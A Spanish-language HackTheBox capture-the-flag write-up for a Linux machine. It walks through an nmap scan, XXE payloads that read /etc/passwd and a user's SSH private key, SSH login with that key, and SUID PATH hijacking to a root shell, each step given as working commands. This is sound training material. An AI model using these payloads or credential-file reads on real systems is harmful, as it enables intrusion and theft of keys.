---
title: "Example Machine — HackTheBox"
date: "2024-12-15"
platform: "HackTheBox"
difficulty: "Hard"
os: "Linux"
excerpt: "Explotación de XXE para leer archivos internos, escalada mediante SUID mal configurado y pivoting a red interna con chisel."
tags:
  - xxe
  - suid
  - pivoting
  - linux
---

## Reconocimiento

Empezamos con un escaneo de puertos para identificar los servicios expuestos:

```bash
nmap -sC -sV -oA scans/initial 10.10.11.30
```

El resultado muestra los puertos 22 (SSH) y 8080 (HTTP) abierto.

## Enumeración web

En el puerto 8080 encontramos una aplicación de carga de archivos XML. Probamos una carga básica para identificar el parser...

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

> **Nota:** La aplicación no filtra entidades externas. XXE confirmado.

## Explotación — XXE

Con el XXE funcional, leemos la clave privada SSH del usuario `developer`:

```bash
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///home/developer/.ssh/id_rsa">]>
```

## Acceso inicial

```bash
chmod 600 id_rsa
ssh -i id_rsa developer@10.10.11.x
```

## Escalada de privilegios

Buscamos binarios con SUID:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Encontramos `/usr/local/bin/custombin` con SUID root. Analizamos el binario...

```bash
strings /usr/local/bin/custombin
# Vemos que llama a 'cat' sin ruta absoluta
```

Explotamos el PATH hijacking:

```bash
echo '/bin/bash' > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH
/usr/local/bin/custombin
# root shell
```

## Conclusión

Esta máquina ilustra dos vulnerabilidades muy comunes en entornos reales: la falta de validación de entidades XML y el uso de comandos sin ruta absoluta en binarios privilegiados. Ambas tienen mitigaciones sencillas pero se siguen viendo en producción.
